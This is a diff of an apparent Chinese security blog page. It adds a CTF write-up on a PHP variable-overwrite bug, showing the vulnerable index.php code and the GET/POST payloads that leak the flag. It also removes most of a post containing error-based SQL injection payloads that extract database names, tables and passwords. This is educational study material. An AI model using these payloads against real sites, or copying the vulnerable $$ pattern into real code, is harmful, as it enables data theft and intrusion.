@@ -275,6 +275,94 @@
 
 
   
+    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  	<time datetime="2021-09-01T16:00:00.000Z" itemprop="datePublished">2021-09-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">
+        变量覆盖漏洞
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>打开页面，然后用dirsearch扫描。发现.git文件泄露<br>flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> index.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;	//GET方式传flag只能传一个flag=flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;	//GET和POST其中之一必须传flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;	//GET和POST传flag,必须不能是flag=flag</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
+
+<p>exit()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()函数会输出一条信息后退出</span><br></pre></td></tr></table></figure>
+<p>我们可以利用这个exit()函数来对调用flag.php文件里的file_get_contents(‘/flag’)，读出flag出来</p>
+<p>因此我们看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x=&gt;$y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>中的$$x和$$y，我们可以看到有变量覆盖漏洞，因此我们get提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
+<p>让$x=yds，$y=flag，所以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x==$$y“相当于”$yds=$flag“</span><br></pre></td></tr></table></figure>
+<p>所以我们要办法利用exit($yds)，因此我们要通过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br></pre></td></tr></table></figure>
+<p>这一个条件，所以我们要让$_GET[‘flag’]和$_POST[‘flag’]不存在，所以之前构造的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
+<p>便符合条件</p>
+<p>而如果想利用exit($is)的话，我们可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>构造get提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure>
+<p>便会构成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x=$$y“相当于”$is=$flag“</span><br></pre></td></tr></table></figure>
+<p>然后我们经过以下条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>
+<p>所以get要提交的参数flag或post要提交参数flag，所以可以构造paload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">get提交：?is=flag</span><br><span class="line">post提交：flag=flag</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-phpmyadmin任意包含文件漏洞及任意代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -848,69 +936,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit 1 offset 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>的解析：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select * from table limit 2,1;</span><br><span class="line">//跳过2条取出1条数据，limit后面是从第2条开始读，读取1条信息，即读取第3条数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from table limit 2 offset 1;</span><br><span class="line">//从第1条（不包括）数据开始取出2条数据，limit后面跟的是2条数据，offset后面是从第1条开始读取，即读取第2,3条</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-报错注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-08-26T16:00:00.000Z" itemprop="datePublished">2021-08-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/27/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-        报错注入(=和空格的过滤)
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="报错注入之等于号和空格的过滤"><a href="#报错注入之等于号和空格的过滤" class="headerlink" title="报错注入之等于号和空格的过滤"></a>报错注入之等于号和空格的过滤</h1><p>等于号和空格的过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;=&quot;相当于&quot;like&quot;</span><br><span class="line"></span><br><span class="line">&quot;空格&quot;相当于&quot;()&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>闭合点为单引号闭合，因此可以构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">爆数据库</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23</span><br><span class="line"></span><br><span class="line">爆数据表</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;geek&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;))))%23</span><br><span class="line"></span><br><span class="line">爆数据列中的内容</span><br><span class="line">aaa&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23</span><br><span class="line"></span><br><span class="line">左边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br><span class="line"></span><br><span class="line">右边内容</span><br><span class="line">aaa&#x27;^extractvalue(1,left(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23</span><br></pre></td></tr></table></figure>
 
 
       
